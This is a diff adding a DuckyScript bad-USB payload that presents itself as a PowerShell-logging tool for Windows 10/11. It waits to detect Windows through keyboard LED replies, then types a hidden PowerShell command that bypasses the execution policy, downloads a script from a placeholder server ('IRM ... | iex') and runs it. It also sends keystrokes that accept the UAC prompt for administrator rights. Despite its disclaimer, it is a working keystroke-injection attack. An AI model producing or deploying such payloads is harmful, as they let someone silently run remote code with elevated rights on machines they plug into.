@@ -1,0 +1,48 @@
+REM Author:      beigeworm 
+REM Title:       Global-Powershell-Logging
+REM Target:      Windows 10/11 
+REM Description: Log all powershell input and output to a text file in the documents folder.
+
+REM **THIS SCRIPT IS INTENDED FOR USE ON SYSTEMS YOU OWN OR HAVE BEEN GIVEN PERMISSION TO USE!**
+
+REM Replace the URL for your own hosted .ps1 raw file.
+DEFINE #SCRIPTURL https://yourserver.com/rawfile/Global-Powershell-Logging.ps1
+
+REM Funtion to detect Windows is ready for keystrokes
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+
+END_EXTENSION
+
+IF $_OS != WINDOWS
+    LED_R                                                                                                                                       
+    STOP_PAYLOAD 
+END_IF
+
+REM Main bad-USB script
+LED_G
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass -W H -C IRM #SCRIPTURL | iex
+DELAY 250
+CTRL-SHIFT ENTER
+DELAY 2500
+ALT y
